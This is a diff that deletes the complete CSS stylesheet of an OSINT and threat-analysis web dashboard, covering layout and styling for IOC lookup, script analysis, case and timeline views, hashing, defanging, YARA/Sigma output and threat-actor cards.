@@ -1,1468 +1,1241 @@
-/* ═══════════════════════════════════════════════════════════
-   ROMEL CENTRALIZED OSINT — COMPLETE STYLESHEET
-   ═══════════════════════════════════════════════════════════ */
-
-:root {
-  --bg:     #0b1220;
-  --bg2:    #0f172a;
-  --text:   #e5e7eb;
-  --muted:  #9ca3af;
-  --border: rgba(255,255,255,0.10);
-  --accent: #38bdf8;
-  --shadow: 0 10px 28px rgba(0,0,0,0.35);
-  --radius: 16px;
-  --radius2:12px;
-}
-
-/* ── Reset ────────────────────────────────────────────────── */
-*, *::before, *::after { box-sizing:border-box; margin:0; padding:0; }
-
-body {
-  font-family:'Segoe UI',system-ui,-apple-system,sans-serif;
-  background:var(--bg);
-  color:var(--text);
-  display:flex;
-  min-height:100vh;
-  font-size:14px;
-  line-height:1.5;
-}
-
-body.light {
-  --bg:#f0f4f8; --bg2:#ffffff; --text:#1e293b;
-  --muted:#64748b; --border:rgba(0,0,0,0.10); --shadow:0 10px 28px rgba(0,0,0,0.10);
-}
-
-::-webkit-scrollbar { width:6px; height:6px; }
-::-webkit-scrollbar-track { background:transparent; }
-::-webkit-scrollbar-thumb { background:rgba(255,255,255,0.12); border-radius:10px; }
-body.light ::-webkit-scrollbar-thumb { background:rgba(0,0,0,0.15); }
-
-/* ── Sidebar ──────────────────────────────────────────────── */
-.sidebar {
-  width:240px; min-width:220px;
-  background:var(--bg2);
-  border-right:1px solid var(--border);
-  display:flex; flex-direction:column;
-  padding:20px 14px; gap:16px;
-  position:sticky; top:0; height:100vh;
-  overflow-y:auto; flex-shrink:0;
-}
-
-.brand { display:flex; align-items:center; gap:10px; padding-bottom:14px; border-bottom:1px solid var(--border); }
-.brand .logo { font-size:28px; line-height:1; }
-.brand h2 { font-size:17px; font-weight:800; letter-spacing:0.5px; color:var(--accent); }
-.brand p { font-size:10px; color:var(--muted); margin-top:1px; }
-
-.actions { display:flex; flex-direction:column; gap:6px; }
-.actions button {
-  width:100%; padding:8px 12px;
-  border-radius:var(--radius2); border:1px solid var(--border);
-  background:rgba(255,255,255,0.04); color:var(--text);
-  font-size:12px; font-weight:600; cursor:pointer; text-align:left;
-  transition:background 0.15s, border-color 0.15s;
-}
-.actions button:hover { background:rgba(56,189,248,0.10); border-color:rgba(56,189,248,0.30); color:var(--accent); }
-
-.sidebar-section { display:flex; flex-direction:column; gap:6px; }
-.sidebar-section-head {
-  font-size:11px; font-weight:700; color:var(--muted);
-  text-transform:uppercase; letter-spacing:0.6px; padding:2px 0;
-}
-
-.history-list { display:flex; flex-direction:column; gap:4px; max-height:260px; overflow-y:auto; }
-.history-empty { font-size:11px; color:var(--muted); padding:4px 2px; }
-.history-item { display:flex; align-items:center; gap:6px; padding:5px 8px; border-radius:8px; cursor:pointer; transition:background 0.12s; font-size:11px; }
-.history-item:hover { background:rgba(56,189,248,0.08); }
-.history-badge { font-size:9px; font-weight:700; padding:1px 5px; border-radius:4px; border:1px solid; white-space:nowrap; flex-shrink:0; }
-.history-val { flex:1; font-family:monospace; font-size:11px; overflow:hidden; text-overflow:ellipsis; white-space:nowrap; color:var(--text); }
-.history-time { font-size:10px; color:var(--muted); white-space:nowrap; }
-
-.case-indicator { padding:8px 10px; background:rgba(56,189,248,0.08); border-radius:10px; border:1px solid rgba(56,189,248,0.2); }
-.case-ind-name { font-weight:700; font-size:13px; color:var(--accent); }
-.case-ind-meta { font-size:11px; color:var(--muted); margin-top:2px; }
-
-.hint { font-size:11px; color:var(--muted); line-height:1.6; padding-top:8px; border-top:1px solid var(--border); margin-top:auto; }
-.hint strong { color:var(--text); }
-
-/* ── Main ─────────────────────────────────────────────────── */
-.main { flex:1; min-width:0; display:flex; flex-direction:column; padding:24px 28px 40px; gap:20px; overflow-x:hidden; }
-
-.header { display:flex; align-items:flex-start; justify-content:space-between; gap:16px; flex-wrap:wrap; padding-bottom:16px; border-bottom:1px solid var(--border); }
-.header h1 {
-  font-size:26px; font-weight:900; letter-spacing:-0.5px;
-  background:linear-gradient(135deg,var(--accent) 0%,#818cf8 100%);
-  -webkit-background-clip:text; -webkit-text-fill-color:transparent; background-clip:text;
-}
-.header .sub { font-size:12px; color:var(--muted); margin-top:4px; }
-
-/* ── Tab Bar ──────────────────────────────────────────────── */
-.tab-bar { display:flex; flex-wrap:wrap; gap:6px; margin-top:10px; }
-.tab-btn {
-  padding:7px 14px; border-radius:10px; border:1px solid var(--border);
-  background:rgba(255,255,255,0.04); color:var(--muted);
-  font-size:12px; font-weight:600; cursor:pointer; transition:all 0.15s; white-space:nowrap;
-}
-.tab-btn:hover { background:rgba(56,189,248,0.08); color:var(--accent); border-color:rgba(56,189,248,0.25); }
-.tab-btn.active {
-  background:linear-gradient(180deg,rgba(56,189,248,0.22) 0%,rgba(56,189,248,0.10) 100%);
-  color:var(--accent); border-color:rgba(56,189,248,0.40);
-  box-shadow:0 2px 8px rgba(56,189,248,0.12);
-}
-
-.tab-panel { display:none; flex-direction:column; gap:20px; }
-.tab-panel.active { display:flex; }
-
-/* ── Input Panel ──────────────────────────────────────────── */
-.input-panel {
-  background:var(--bg2); border:1px solid var(--border);
-  border-radius:var(--radius); padding:18px 20px;
-  display:flex; flex-direction:column; gap:10px; box-shadow:var(--shadow);
-}
-
-.input-row { display:flex; gap:10px; align-items:center; }
-
-.searchbox {
-  flex:1; display:flex; align-items:center; gap:8px;
-  background:rgba(255,255,255,0.05); border:1px solid var(--border);
-  border-radius:var(--radius2); padding:0 12px;
-  transition:border-color 0.15s, box-shadow 0.15s;
-}
-.searchbox:focus-within { border-color:var(--accent); box-shadow:0 0 0 3px rgba(56,189,248,0.12); }
-.searchbox.has-value { border-color:rgba(56,189,248,0.35); }
-.search-ico { font-size:15px; opacity:0.5; flex-shrink:0; }
-.searchbox input { flex:1; background:none; border:none; outline:none; color:var(--text); font-size:13px; padding:11px 0; font-family:inherit; min-width:0; }
-.searchbox input::placeholder { color:var(--muted); }
-.clear-input { background:none; border:none; color:var(--muted); cursor:pointer; font-size:14px; padding:4px; border-radius:6px; line-height:1; display:none; flex-shrink:0; }
-.searchbox.has-value .clear-input { display:block; }
-.clear-input:hover { color:#f87171; background:rgba(248,113,113,0.1); }
-
-#search-btn {
-  padding:10px 22px;
-  background:linear-gradient(135deg,var(--accent) 0%,#818cf8 100%);
-  border:none; border-radius:var(--radius2); color:#fff;
-  font-size:13px; font-weight:700; cursor:pointer; white-space:nowrap;
-  box-shadow:0 4px 14px rgba(56,189,248,0.30);
-  transition:opacity 0.15s, transform 0.1s;
-}
-#search-btn:hover { opacity:0.88; transform:translateY(-1px); }
-#search-btn:active { transform:translateY(0); }
-
-.tools { display:flex; flex-wrap:wrap; gap:6px; }
-.tools button {
-  padding:6px 14px; border-radius:9px; border:1px solid var(--border);
-  background:rgba(255,255,255,0.04); color:var(--text);
-  font-size:12px; font-weight:600; cursor:pointer; transition:all 0.14s;
-}
-.tools button:hover { background:rgba(56,189,248,0.10); border-color:rgba(56,189,248,0.30); color:var(--accent); }
-
-.status {
-  display:flex; align-items:center; justify-content:space-between;
-  font-size:11px; color:var(--muted); padding:6px 10px;
-  background:rgba(255,255,255,0.03); border-radius:8px; border:1px solid var(--border);
-}
-.badge { font-size:10px; font-weight:700; padding:2px 7px; border-radius:5px; background:rgba(56,189,248,0.15); color:var(--accent); letter-spacing:0.5px; }
-
-.verdict-banner { display:flex; align-items:center; gap:12px; padding:10px 14px; border-radius:12px; border:1px solid; font-size:13px; }
-.verdict-icon { font-size:20px; flex-shrink:0; }
-.verdict-type { font-weight:700; margin-right:8px; }
-.verdict-value { font-family:monospace; font-size:13px; word-break:break-all; color:var(--text); }
-
-#output {
-  width:100%; min-height:120px; max-height:240px;
-  background:rgba(0,0,0,0.20); border:1px solid var(--border);
-  border-radius:var(--radius2); color:var(--text);
-  font-family:'Cascadia Code','Fira Code','Courier New',monospace;
-  font-size:12px; padding:10px 12px; resize:vertical; outline:none;
-  transition:border-color 0.15s; line-height:1.6;
-}
-#output:focus { border-color:rgba(56,189,248,0.35); }
-.hintline { font-size:11px; color:var(--muted); }
-
-/* ── Tool Sections ────────────────────────────────────────── */
-.tool-section { background:var(--bg2); border:1px solid var(--border); border-radius:var(--radius); overflow:hidden; box-shadow:var(--shadow); display:none; }
-body:not(.search-mode) .tool-section { display:block; }
-body.search-mode .tool-section.active { display:block; }
-body.search-mode .tool-section.tool-always { display:block; }
-
-.section-head { display:flex; align-items:center; justify-content:space-between; padding:14px 18px; border-bottom:1px solid var(--border); background:rgba(255,255,255,0.02); }
-.section-head h2 { font-size:14px; font-weight:800; color:var(--text); letter-spacing:0.2px; }
-.pill { font-size:10px; font-weight:700; padding:3px 9px; border-radius:20px; background:rgba(56,189,248,0.12); color:var(--accent); letter-spacing:0.3px; }
-
-.tool-grid { display:grid; grid-template-columns:repeat(auto-fill,minmax(180px,1fr)); gap:1px; background:var(--border); }
-.tool-grid a { display:flex; flex-direction:column; gap:4px; padding:12px 14px; background:var(--bg2); text-decoration:none; transition:background 0.13s; cursor:pointer; }
-.tool-grid a:hover { background:rgba(56,189,248,0.07); }
-.tool-grid a .title { font-size:12px; font-weight:700; color:var(--text); display:flex; align-items:center; gap:5px; line-height:1.3; }
-.tool-grid a:hover .title { color:var(--accent); }
-.tool-grid a .lock { font-size:10px; opacity:0.35; margin-left:auto; flex-shrink:0; }
-.tool-grid a .meta { font-size:10px; color:var(--muted); font-family:monospace; white-space:nowrap; overflow:hidden; text-overflow:ellipsis; line-height:1.3; }
-
-/* ── MITRE Panel ──────────────────────────────────────────── */
-.tool-section.tool-always { display:block !important; }
-#mitre-panel { display:grid; grid-template-columns:repeat(auto-fill,minmax(280px,1fr)); gap:4px; padding:10px 14px 6px; }
-#mitre-panel label { display:flex; align-items:center; gap:8px; font-size:12px; color:var(--muted); cursor:pointer; padding:5px 6px; border-radius:7px; transition:background 0.12s,color 0.12s; line-height:1.4; }
-#mitre-panel label:hover { background:rgba(56,189,248,0.07); color:var(--text); }
-#mitre-panel input[type=checkbox] { accent-color:var(--accent); width:14px; height:14px; flex-shrink:0; cursor:pointer; }
-#mitre-panel label:has(input:checked) { background:rgba(56,189,248,0.12); color:var(--accent); }
-
-.mitre-suggested { padding:10px 14px 6px; border-bottom:1px solid var(--border); }
-.mitre-suggested-label { font-size:11px; color:var(--muted); margin-bottom:6px; font-weight:600; }
-.mitre-suggested-tags { display:flex; flex-wrap:wrap; gap:6px; }
-.mitre-suggest-tag { font-size:11px; padding:3px 9px; border-radius:7px; border:1px solid rgba(251,191,36,0.3); background:rgba(251,191,36,0.08); color:#fbbf24; cursor:pointer; transition:all 0.13s; }
-.mitre-suggest-tag:hover { background:rgba(251,191,36,0.18); }
-.mitre-suggest-tag.applied { background:rgba(52,211,153,0.12); color:#34d399; border-color:rgba(52,211,153,0.3); }
-
-/* ── Bulk IOC ─────────────────────────────────────────────── */
-.bulk-header { margin-bottom:4px; }
-.bulk-header h3 { font-size:15px; font-weight:800; margin-bottom:4px; }
-.bulk-header .sub { font-size:12px; color:var(--muted); }
-
-#bulk-input {
-  width:100%; min-height:160px; background:rgba(0,0,0,0.20);
-  border:1px solid var(--border); border-radius:var(--radius2);
-  color:var(--text); font-family:monospace; font-size:12px;
-  padding:10px 12px; resize:vertical; outline:none; line-height:1.6;
-}
-#bulk-input:focus { border-color:rgba(56,189,248,0.35); }
-
-.bulk-results { display:flex; flex-direction:column; gap:10px; }
-.bulk-empty { font-size:12px; color:var(--muted); padding:16px; text-align:center; }
-.bulk-ioc-card { background:var(--bg2); border:1px solid var(--border); border-radius:var(--radius2); overflow:hidden; }
-.bulk-ioc-head { display:flex; align-items:center; gap:10px; padding:10px 14px; background:rgba(255,255,255,0.02); border-bottom:1px solid var(--border); flex-wrap:wrap; }
-.bulk-ioc-type { font-size:10px; font-weight:700; padding:2px 7px; border-radius:5px; border:1px solid; }
-.bulk-ioc-val { font-family:monospace; font-size:12px; word-break:break-all; flex:1; }
-.bulk-link-grid { display:flex; flex-wrap:wrap; gap:6px; padding:10px 14px; }
-.bulk-link { font-size:11px; padding:4px 10px; border-radius:7px; border:1px solid rgba(56,189,248,0.20); background:rgba(56,189,248,0.07); color:var(--accent); text-decoration:none; transition:all 0.13s; white-space:nowrap; }
-.bulk-link:hover { background:rgba(56,189,248,0.16); border-color:rgba(56,189,248,0.40); }
-
-/* ── Script Analyzer ──────────────────────────────────────── */
-.sa-mode-bar { display:flex; flex-wrap:wrap; gap:6px; }
-.sa-mode-btn { padding:7px 14px; border-radius:9px; border:1px solid var(--border); background:rgba(255,255,255,0.04); color:var(--muted); font-size:12px; font-weight:600; cursor:pointer; transition:all 0.14s; }
-.sa-mode-btn:hover { background:rgba(56,189,248,0.08); color:var(--accent); border-color:rgba(56,189,248,0.25); }
-.sa-mode-btn.active { background:linear-gradient(180deg,rgba(56,189,248,0.20),rgba(56,189,248,0.08)); color:var(--accent); border-color:rgba(56,189,248,0.40); }
-
-.sa-input-header { display:flex; align-items:flex-start; justify-content:space-between; gap:12px; flex-wrap:wrap; margin-bottom:10px; }
-.sa-actions { display:flex; flex-wrap:wrap; gap:6px; align-items:flex-start; }
-.sa-actions button { padding:7px 13px; border-radius:9px; border:1px solid var(--border); background:rgba(255,255,255,0.04); color:var(--text); font-size:12px; font-weight:600; cursor:pointer; transition:all 0.14s; white-space:nowrap; }
-.sa-actions button:hover { background:rgba(56,189,248,0.10); border-color:rgba(56,189,248,0.30); color:var(--accent); }
-
-#sa-input {
-  width:100%; min-height:160px; background:rgba(0,0,0,0.22);
-  border:1px solid var(--border); border-radius:var(--radius2);
-  color:var(--text); font-family:'Cascadia Code','Fira Code','Courier New',monospace;
-  font-size:12px; padding:10px 12px; resize:vertical; outline:none; line-height:1.6;
-}
-#sa-input:focus { border-color:rgba(56,189,248,0.35); }
-.sa-results { display:flex; flex-direction:column; gap:12px; }
-
-.sa-verdict { border-radius:13px; border:1px solid; padding:14px 16px; display:flex; align-items:center; justify-content:space-between; gap:12px; flex-wrap:wrap; }
-.sa-verdict-left { flex:1; }
-.sa-verdict-label { font-size:15px; font-weight:800; margin-bottom:4px; }
-.sa-verdict-meta { font-size:11px; color:var(--muted); }
-.sa-risk-badge { font-size:12px; font-weight:700; padding:5px 12px; border-radius:9px; border:1px solid; white-space:nowrap; }
-
-.sa-section { background:var(--bg2); border:1px solid var(--border); border-radius:var(--radius2); overflow:hidden; }
-.sa-section-head { font-size:12px; font-weight:700; padding:9px 14px; border-bottom:1px solid var(--border); background:rgba(255,255,255,0.02); color:var(--muted); text-transform:uppercase; letter-spacing:0.4px; }
-.sa-flag-list { display:flex; flex-direction:column; gap:1px; background:var(--border); }
-.sa-flag { display:flex; align-items:flex-start; gap:10px; padding:9px 14px; background:var(--bg2); font-size:12px; line-height:1.5; }
-.sa-flag-icon { flex-shrink:0; margin-top:1px; }
-.sa-flag-text { flex:1; color:var(--text); }
-.sa-flag-code { font-family:monospace; font-size:11px; background:rgba(0,0,0,0.25); padding:2px 7px; border-radius:5px; word-break:break-all; color:#fca5a5; }
-.sa-flag-sev { font-size:10px; font-weight:700; padding:1px 6px; border-radius:5px; flex-shrink:0; }
-.sa-flag-sev.critical { background:rgba(248,113,113,0.15); color:#f87171; border:1px solid rgba(248,113,113,0.3); }
-.sa-flag-sev.high     { background:rgba(251,146,60,0.15);  color:#fb923c; border:1px solid rgba(251,146,60,0.3); }
-.sa-flag-sev.medium   { background:rgba(251,191,36,0.12);  color:#fbbf24; border:1px solid rgba(251,191,36,0.3); }
-.sa-flag-sev.low      { background:rgba(52,211,153,0.10);  color:#34d399; border:1px solid rgba(52,211,153,0.3); }
-.sa-decoded-block { padding:10px 14px; font-family:monospace; font-size:11px; color:#a5f3fc; word-break:break-all; line-height:1.6; white-space:pre-wrap; max-height:200px; overflow-y:auto; }
-
-.sa-ioc-grid { display:grid; grid-template-columns:repeat(auto-fill,minmax(240px,1fr)); gap:1px; background:var(--border); }
-.sa-ioc-group { background:var(--bg2); padding:10px 14px; display:flex; flex-direction:column; gap:5px; }
-.sa-ioc-group-label { font-size:10px; font-weight:700; text-transform:uppercase; letter-spacing:0.4px; margin-bottom:3px; }
-.sa-ioc-row { display:flex; align-items:center; gap:6px; flex-wrap:wrap; }
-.sa-ioc-val { font-family:monospace; font-size:11px; word-break:break-all; flex:1; color:var(--text); }
-.sa-mitre-list { display:flex; flex-wrap:wrap; gap:6px; padding:10px 14px; }
-.sa-mitre-tag { font-size:11px; padding:3px 9px; border-radius:7px; border:1px solid rgba(56,189,248,0.25); background:rgba(56,189,248,0.08); color:var(--accent); text-decoration:none; transition:background 0.12s; }
-.sa-mitre-tag:hover { background:rgba(56,189,248,0.18); }
-
-/* ── Alert Write-up ───────────────────────────────────────── */
-.aw-layout { display:grid; grid-template-columns:240px 1fr; gap:16px; min-height:500px; }
-@media(max-width:800px){ .aw-layout { grid-template-columns:1fr; } }
-
-.aw-sidebar { background:var(--bg2); border:1px solid var(--border); border-radius:var(--radius); overflow:hidden; display:flex; flex-direction:column; }
-.aw-sidebar-head { font-size:12px; font-weight:700; padding:12px 14px; border-bottom:1px solid var(--border); background:rgba(255,255,255,0.02); color:var(--muted); text-transform:uppercase; letter-spacing:0.4px; }
-.aw-platform-bar { display:flex; flex-wrap:wrap; gap:4px; padding:8px 10px; border-bottom:1px solid var(--border); }
-.aw-plat-btn { font-size:10px; font-weight:700; padding:4px 8px; border-radius:7px; border:1px solid var(--border); background:transparent; color:var(--muted); cursor:pointer; transition:all 0.13s; }
-.aw-plat-btn:hover { color:var(--accent); border-color:rgba(56,189,248,0.3); }
-.aw-plat-btn.active { background:rgba(56,189,248,0.14); color:var(--accent); border-color:rgba(56,189,248,0.35); }
-.aw-template-list { flex:1; overflow-y:auto; }
-.aw-template-item { padding:9px 12px; border-bottom:1px solid var(--border); cursor:pointer; transition:background 0.12s; display:flex; flex-direction:column; gap:3px; }
-.aw-template-item:hover { background:rgba(56,189,248,0.06); }
-.aw-template-item.active { background:rgba(56,189,248,0.12); border-left:3px solid var(--accent); }
-.aw-tpl-name { font-size:12px; font-weight:700; color:var(--text); line-height:1.3; }
-.aw-tpl-meta { display:flex; gap:5px; align-items:center; flex-wrap:wrap; }
-.aw-tpl-plat { font-size:9px; font-weight:700; padding:1px 5px; border-radius:4px; border:1px solid; }
-.aw-tpl-sev { font-size:9px; font-weight:700; padding:1px 5px; border-radius:4px; }
-
-.aw-main { background:var(--bg2); border:1px solid var(--border); border-radius:var(--radius); overflow:hidden; display:flex; flex-direction:column; }
-.aw-template-info { padding:14px 16px; border-bottom:1px solid var(--border); background:rgba(255,255,255,0.02); }
-.aw-ti-head { display:flex; align-items:center; gap:10px; flex-wrap:wrap; }
-.aw-ti-mitre { display:flex; flex-wrap:wrap; gap:4px; }
-.aw-ti-mitre a { font-size:10px; padding:2px 7px; border-radius:5px; border:1px solid rgba(56,189,248,0.22); background:rgba(56,189,248,0.07); color:var(--accent); text-decoration:none; }
-
-.aw-form { flex:1; padding:14px 16px; display:flex; flex-direction:column; gap:10px; overflow-y:auto; }
-.aw-form-placeholder { font-size:13px; color:var(--muted); padding:20px 0; }
-.aw-field { display:flex; flex-direction:column; gap:4px; }
-.aw-field label { font-size:11px; font-weight:700; color:var(--muted); text-transform:uppercase; letter-spacing:0.4px; }
-.aw-input { background:rgba(255,255,255,0.05); border:1px solid var(--border); border-radius:9px; color:var(--text); font-size:12px; padding:8px 11px; outline:none; font-family:inherit; transition:border-color 0.15s; width:100%; }
-.aw-input:focus { border-color:rgba(56,189,248,0.40); }
-.aw-textarea { resize:vertical; min-height:80px; line-height:1.6; }
-select.aw-input { cursor:pointer; }
-
-.aw-action-bar { padding:12px 16px; border-top:1px solid var(--border); background:rgba(255,255,255,0.02); display:flex; align-items:center; justify-content:space-between; gap:10px; flex-wrap:wrap; }
-.aw-output-tabs { display:flex; gap:6px; }
-.aw-out-tab { font-size:11px; font-weight:700; padding:5px 11px; border-radius:8px; border:1px solid var(--border); background:transparent; color:var(--muted); cursor:pointer; transition:all 0.13s; }
-.aw-out-tab.active { background:rgba(56,189,248,0.14); color:var(--accent); border-color:rgba(56,189,248,0.35); }
-.aw-btns { display:flex; gap:6px; flex-wrap:wrap; }
-.aw-btns button { font-size:12px; font-weight:700; padding:7px 14px; border-radius:9px; border:1px solid var(--border); background:rgba(255,255,255,0.04); color:var(--text); cursor:pointer; transition:all 0.13s; }
-.aw-btns button:hover { background:rgba(56,189,248,0.10); border-color:rgba(56,189,248,0.30); color:var(--accent); }
-#aw-generate-btn { background:linear-gradient(135deg,var(--accent),#818cf8); color:#fff; border:none; box-shadow:0 3px 12px rgba(56,189,248,0.25); }
-#aw-generate-btn:hover { opacity:0.88; color:#fff; }
-
-.aw-output { margin:12px 16px; background:rgba(0,0,0,0.25); border:1px solid rgba(56,189,248,0.15); border-radius:var(--radius2); overflow:hidden; }
-.aw-output pre { font-family:'Cascadia Code','Fira Code','Courier New',monospace; font-size:11.5px; color:#a5f3fc; padding:14px 16px; white-space:pre-wrap; word-break:break-word; line-height:1.7; max-height:500px; overflow-y:auto; }
-
-/* ── Responsive ───────────────────────────────────────────── */
-@media(max-width:900px) { .sidebar{width:200px;min-width:180px;} .main{padding:16px 14px 32px;} }
-@media(max-width:680px) {
-  body { flex-direction:column; }
-  .sidebar { width:100%; height:auto; position:static; flex-direction:row; flex-wrap:wrap; padding:12px; gap:10px; }
-  .brand { border-bottom:none; padding-bottom:0; }
-  .history-list,.hint { display:none; }
-  .main { padding:12px 10px 24px; }
-}
-
-/* ═══════════════════════════════════════════════════════════════
-   NEW FEATURE STYLES
-   ═══════════════════════════════════════════════════════════════ */
-
-/* Case Manager */
-.case-controls { display:flex; gap:8px; flex-wrap:wrap; margin-bottom:10px; }
-.case-body { padding:12px 0; }
-.case-header-card { background:rgba(56,189,248,0.06); border:1px solid rgba(56,189,248,0.18); border-radius:14px; padding:16px; margin-bottom:16px; }
-.case-title { font-size:17px; font-weight:800; color:var(--text); margin-bottom:8px; }
-.case-meta-row { display:flex; align-items:center; gap:12px; font-size:12px; color:var(--muted); flex-wrap:wrap; }
-.case-ioc-list { display:flex; flex-direction:column; gap:8px; }
-.case-ioc-row { display:flex; align-items:center; gap:8px; background:rgba(255,255,255,0.03); border-radius:10px; padding:8px 12px; flex-wrap:wrap; }
-.case-ioc-badge { font-size:10px; font-weight:700; padding:2px 7px; border-radius:6px; border:1px solid; white-space:nowrap; }
-.case-ioc-val { font-family:monospace; font-size:12px; flex:1; min-width:100px; word-break:break-all; }
-.case-ioc-time { font-size:11px; color:var(--muted); white-space:nowrap; }
-.case-ioc-note { font-size:11px; }
-.case-remove-ioc { background:transparent; border:1px solid rgba(248,113,113,0.3); border-radius:6px; cursor:pointer; padding:3px 8px; color:var(--text); }
-
-/* Timeline */
-.timeline-controls { display:flex; gap:8px; flex-wrap:wrap; margin-bottom:10px; }
-.timeline-body { padding:12px 0; }
-.timeline-track { position:relative; padding-left:30px; }
-.timeline-track::before { content:""; position:absolute; left:11px; top:0; bottom:0; width:2px; background:linear-gradient(to bottom,rgba(56,189,248,0.4),rgba(56,189,248,0.05)); }
-.tl-event { position:relative; margin-bottom:18px; }
-.tl-dot { position:absolute; left:-23px; top:14px; width:14px; height:14px; border-radius:50%; border:2px solid var(--bg); z-index:1; }
-.tl-card { background:rgba(255,255,255,0.04); border:1px solid var(--border); border-left:3px solid; border-radius:12px; padding:12px 14px; }
-.tl-time { font-size:11px; color:var(--muted); margin-bottom:4px; }
-.tl-label { font-size:11px; font-weight:700; margin-bottom:4px; }
-.tl-desc { font-size:13px; color:var(--text); line-height:1.5; }
-.tl-remove { background:transparent; border:none; color:rgba(248,113,113,0.6); font-size:11px; cursor:pointer; margin-top:6px; padding:2px 6px; border-radius:6px; }
-.tl-remove:hover { color:#f87171; background:rgba(248,113,113,0.1); }
-
-/* Hash File */
-.hash-dropzone { border:2px dashed rgba(56,189,248,0.35); border-radius:16px; padding:40px 20px; text-align:center; cursor:pointer; transition:all 0.2s; background:rgba(56,189,248,0.03); margin:10px 0; }
-.hash-dropzone:hover,.hash-dropzone.drag-over { border-color:var(--accent); background:rgba(56,189,248,0.08); }
-.hash-drop-inner { pointer-events:none; }
-.hash-results { margin-top:16px; }
-.hash-result-card { background:rgba(255,255,255,0.04); border:1px solid var(--border); border-radius:14px; padding:16px; }
-.hash-file-info { display:flex; align-items:center; gap:12px; margin-bottom:14px; padding-bottom:12px; border-bottom:1px solid var(--border); }
-.hash-filename { font-weight:700; font-size:14px; }
-.hash-filesize { font-size:12px; color:var(--muted); }
-.hash-row { display:flex; align-items:center; gap:10px; margin-bottom:10px; flex-wrap:wrap; }
-.hash-row-muted { opacity:0.6; }
-.hash-algo { font-size:11px; font-weight:700; color:var(--muted); width:60px; flex-shrink:0; }
-.hash-val { font-size:12px; font-family:monospace; background:rgba(0,0,0,0.2); padding:4px 8px; border-radius:6px; word-break:break-all; flex:1; }
-.hash-copy-btn,.hash-pivot-btn { font-size:11px; padding:4px 8px; border-radius:8px; cursor:pointer; border:1px solid rgba(56,189,248,0.3); background:rgba(56,189,248,0.08); color:var(--accent); }
-.hash-pivot-links { margin-top:14px; padding-top:12px; border-top:1px solid var(--border); display:flex; flex-wrap:wrap; gap:6px; align-items:center; }
-.hash-pivot-label { font-size:11px; color:var(--muted); width:100%; margin-bottom:2px; }
-.hash-computing { padding:20px; text-align:center; color:var(--muted); }
-
-/* Bulk Defang / Refang */
-.defang-layout { display:grid; grid-template-columns:1fr 1fr; gap:12px; margin-top:10px; }
-@media(max-width:700px){ .defang-layout{grid-template-columns:1fr;} }
-.defang-pane { display:flex; flex-direction:column; gap:6px; }
-.defang-pane-head { font-size:12px; font-weight:700; color:var(--muted); }
-.defang-pane textarea { flex:1; min-height:260px; font-family:monospace; font-size:12px; resize:vertical; background:rgba(0,0,0,0.20); border:1px solid var(--border); border-radius:var(--radius2); color:var(--text); padding:10px 12px; outline:none; }
-.defang-pane textarea:focus { border-color:rgba(56,189,248,0.35); }
-.dfb-diff { background:rgba(0,0,0,0.2); border:1px solid var(--border); border-radius:12px; padding:12px; margin-top:12px; font-size:12px; max-height:300px; overflow-y:auto; }
-.diff-head { font-weight:700; margin-bottom:8px; color:var(--muted); }
-.diff-row { margin-bottom:6px; padding:4px 0; border-bottom:1px solid rgba(255,255,255,0.04); }
-.diff-minus { display:block; color:#f87171; font-family:monospace; word-break:break-all; }
-.diff-plus { display:block; color:#34d399; font-family:monospace; word-break:break-all; }
-
-/* YARA / Sigma */
-.yara-tabs { display:flex; gap:6px; margin-bottom:14px; }
-.yara-tab-btn { padding:7px 16px; border-radius:10px; border:1px solid var(--border); background:transparent; color:var(--muted); cursor:pointer; font-size:13px; font-weight:600; transition:all 0.14s; }
-.yara-tab-btn.active { background:rgba(56,189,248,0.15); color:var(--accent); border-color:rgba(56,189,248,0.35); }
-.yara-panel { margin-top:4px; }
-.yara-form { display:flex; flex-direction:column; gap:8px; }
-.rule-output { background:rgba(0,0,0,0.3); border:1px solid rgba(56,189,248,0.2); border-radius:12px; padding:16px; font-family:'Cascadia Code','Fira Code','Courier New',monospace; font-size:12px; color:#a5f3fc; line-height:1.6; white-space:pre; overflow-x:auto; margin-top:12px; }
-
-/* CVE Enrichment */
-.cve-enrichment { margin:12px 0; }
-.cve-enrich-card { background:rgba(248,113,113,0.07); border:1px solid rgba(248,113,113,0.25); border-radius:14px; padding:14px 16px; }
-.cve-enrich-head { display:flex; align-items:center; gap:12px; flex-wrap:wrap; margin-bottom:10px; }
-.cve-enrich-id { font-size:16px; font-weight:800; color:#f87171; }
-.cve-kev-badge { font-size:11px; font-weight:700; background:rgba(248,113,113,0.2); color:#f87171; border:1px solid rgba(248,113,113,0.4); padding:3px 9px; border-radius:8px; }
-.cve-kev-safe { font-size:11px; color:#34d399; }
-.cve-enrich-links { display:flex; flex-wrap:wrap; gap:6px; margin-bottom:8px; }
-.cve-enrich-note { font-size:11px; color:var(--muted); line-height:1.5; }
-
-/* Threat Actor */
-.ta-results { padding:12px 0; display:flex; flex-direction:column; gap:14px; }
-.ta-card { background:rgba(255,255,255,0.04); border:1px solid var(--border); border-radius:16px; padding:16px; }
-.ta-card-head { display:flex; justify-content:space-between; align-items:flex-start; gap:12px; margin-bottom:10px; }
-.ta-name { font-size:18px; font-weight:800; color:var(--text); }
-.ta-aliases { font-size:11px; color:var(--muted); margin-top:3px; }
-.ta-nation { font-size:11px; font-weight:700; padding:4px 10px; border-radius:8px; border:1px solid; white-space:nowrap; }
-.ta-desc { font-size:13px; color:var(--muted); line-height:1.6; margin-bottom:12px; }
-.ta-section-label { font-size:11px; font-weight:700; color:var(--muted); margin:10px 0 6px; text-transform:uppercase; letter-spacing:0.5px; }
-.ta-ttp-list { display:flex; flex-wrap:wrap; gap:6px; margin-bottom:8px; }
-.ta-tools { display:flex; flex-wrap:wrap; gap:6px; }
-.ta-tool-tag { font-size:11px; background:rgba(251,191,36,0.12); color:#fbbf24; border:1px solid rgba(251,191,36,0.3); padding:3px 8px; border-radius:6px; }
-.ta-pivot-links { margin-top:12px; display:flex; flex-wrap:wrap; gap:6px; }
-
-/* Custom Tools */
-.custom-tool-form { display:flex; gap:8px; flex-wrap:wrap; margin-bottom:10px; }
-.ct-list { display:flex; flex-direction:column; gap:8px; padding:12px 0; }
-.ct-tool-row { display:flex; align-items:center; gap:10px; background:rgba(255,255,255,0.04); border-radius:12px; padding:10px 14px; flex-wrap:wrap; }
-.ct-icon { font-size:22px; }
-.ct-info { flex:1; min-width:120px; }
-.ct-tool-name { font-weight:700; font-size:13px; }
-.ct-tool-url { font-size:11px; color:var(--muted); font-family:monospace; word-break:break-all; }
